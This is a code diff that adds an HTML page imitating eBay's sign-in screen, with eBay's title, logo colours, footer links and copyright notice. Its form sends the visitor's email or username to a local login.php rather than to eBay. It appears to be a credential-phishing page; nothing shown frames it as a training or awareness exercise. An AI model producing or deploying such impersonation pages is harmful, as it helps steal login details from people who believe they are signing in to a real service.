@@ -1,0 +1,268 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>eBay - Electronics, Cars, Fashion, Collections & More | eBay</title>
+    <link
+      rel="icon"
+      href="data:image/x-icon;base64,AAABAAEAEBAQAAEABAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAgAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAA"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Market Sans", Arial, sans-serif;
+        background-color: #f7f7f7;
+      }
+
+      .header {
+        background-color: #fff;
+        border-bottom: 1px solid #e5e5e5;
+        padding: 10px 0;
+      }
+
+      .header-content {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 20px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      .logo {
+        font-size: 36px;
+        font-weight: bold;
+        color: #e53238;
+        text-decoration: none;
+        font-family: Arial, sans-serif;
+      }
+
+      .logo span:nth-child(1) {
+        color: #e53238;
+      }
+      .logo span:nth-child(2) {
+        color: #0064d2;
+      }
+      .logo span:nth-child(3) {
+        color: #f5af02;
+      }
+      .logo span:nth-child(4) {
+        color: #86b817;
+      }
+
+      .container {
+        max-width: 450px;
+        margin: 60px auto;
+        background: #fff;
+        padding: 40px;
+        border-radius: 4px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      h1 {
+        font-size: 28px;
+        color: #333;
+        margin-bottom: 30px;
+        font-weight: 400;
+      }
+
+      .input-group {
+        margin-bottom: 20px;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 8px;
+        color: #707070;
+        font-size: 14px;
+      }
+
+      input[type="email"],
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #c7c7c7;
+        border-radius: 4px;
+        font-size: 15px;
+        outline: none;
+        transition: border-color 0.3s;
+      }
+
+      input[type="email"]:focus,
+      input[type="text"]:focus,
+      input[type="password"]:focus {
+        border-color: #0064d2;
+      }
+
+      .btn-signin {
+        width: 100%;
+        padding: 14px;
+        background-color: #3665f3;
+        color: #fff;
+        border: none;
+        border-radius: 24px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.3s;
+        margin-top: 10px;
+      }
+
+      .btn-signin:hover {
+        background-color: #0053ba;
+      }
+
+      .divider {
+        text-align: center;
+        margin: 25px 0;
+        position: relative;
+      }
+
+      .divider::before {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 0;
+        right: 0;
+        height: 1px;
+        background: #c7c7c7;
+      }
+
+      .divider span {
+        background: #fff;
+        padding: 0 10px;
+        position: relative;
+        color: #707070;
+        font-size: 14px;
+      }
+
+      .create-account {
+        text-align: center;
+        margin-top: 20px;
+      }
+
+      .create-account a {
+        color: #3665f3;
+        text-decoration: none;
+        font-size: 14px;
+      }
+
+      .create-account a:hover {
+        text-decoration: underline;
+      }
+
+      .footer {
+        max-width: 450px;
+        margin: 20px auto;
+        text-align: center;
+        font-size: 12px;
+        color: #707070;
+      }
+
+      .footer a {
+        color: #3665f3;
+        text-decoration: none;
+        margin: 0 10px;
+      }
+
+      .footer a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <div class="header-content">
+        <a href="#" class="logo">
+          <span>e</span><span>B</span><span>a</span><span>y</span>
+        </a>
+      </div>
+    </div>
+
+    <div class="container">
+      <h1>Hello</h1>
+      <p style="color: #707070; margin-bottom: 30px">
+        Sign in to eBay or
+        <a href="#" style="color: #3665f3; text-decoration: none"
+          >create an account</a
+        >
+      </p>
+
+      <form action="login.php" method="POST">
+        <div class="input-group">
+          <label for="email">Email or username</label>
+          <input type="text" id="email" name="email" required />
+        </div>
+
+        <button type="submit" class="btn-signin">Continue</button>
+      </form>
+
+      <div class="divider">
+        <span>or</span>
+      </div>
+
+      <div style="text-align: center; margin-top: 20px">
+        <a
+          href="#"
+          style="color: #3665f3; text-decoration: none; font-size: 14px"
+          >Continue with Google</a
+        ><br />
+        <a
+          href="#"
+          style="
+            color: #3665f3;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 10px;
+            display: inline-block;
+          "
+          >Continue with Facebook</a
+        ><br />
+        <a
+          href="#"
+          style="
+            color: #3665f3;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 10px;
+            display: inline-block;
+          "
+          >Continue with Apple</a
+        >
+      </div>
+
+      <div
+        style="
+          margin-top: 30px;
+          padding-top: 20px;
+          border-top: 1px solid #e5e5e5;
+        "
+      >
+        <p style="font-size: 13px; color: #707070; text-align: center">
+          Stay signed in using a passkey. Biometric login that's more secure
+          than passwords. <a href="#" style="color: #3665f3">Set up passkey</a>
+        </p>
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>
+        <a href="#">About eBay</a>
+        <a href="#">Announcements</a>
+        <a href="#">Community</a>
+        <a href="#">Security Center</a>
+        <a href="#">Policies</a>
+      </p>
+      <p style="margin-top: 10px">
+        Copyright © 1995-2026 eBay Inc. All Rights Reserved.
+      </p>
+    </div>
+  </body>
+</html>
